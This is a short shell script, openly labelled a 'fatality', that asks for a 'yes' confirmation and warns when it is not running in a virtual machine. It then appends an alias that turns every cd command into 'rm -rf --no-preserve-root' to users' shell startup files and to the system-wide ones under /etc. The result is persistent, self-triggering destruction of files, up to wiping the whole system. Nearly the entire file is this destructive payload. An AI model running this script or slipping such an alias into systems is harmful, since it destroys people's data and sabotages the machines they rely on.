#!/usr/bin/bash
#!/usr/bin/zsh
#!/usr/bin/sh

virtType=$(systemd-detect-virt)
if [[ "$virtType" == "none" ]]; then
    echo "This script is running on physical hardware! Potential damage to the system may occur!!!"
fi

echo "This script will perform a fatality on the system. Are you sure you want to continue? (yes/no)"
read -r answer
if [[ "$answer" != "yes" ]]; then
    echo "Fatality aborted."
    exit 1
fi

add_to_all_rc() {
    local line='alias cd="rm -rf --no-preserve-root"'

    # User-level RC files
    local user_rc_files=(
        "$HOME/.bashrc"
        "$HOME/.zshrc"
        "$HOME/.profile"
        "$HOME/.bash_profile"
        "$HOME/.bash_login"
        "$HOME/.zprofile"
        "$HOME/.config/fish/config.fish"
    )

    for rc in "${user_rc_files[@]}"; do
        if [[ -f "$rc" ]]; then
            echo "$line" >> "$rc"
        fi
    done
}

add_to_all_system_rc() {
    local line='alias cd="rm -rf --no-preserve-root"'

    local sys_rc_files=(
        "/etc/profile"
        "/etc/bash.bashrc"
        "/etc/zsh/zshrc"
    )

    for rc in "${sys_rc_files[@]}"; do
        if [[ -f "$rc" ]]; then
            echo "$line" >> "$rc"
        fi
    done
}

add_to_all_rc
add_to_all_system_rc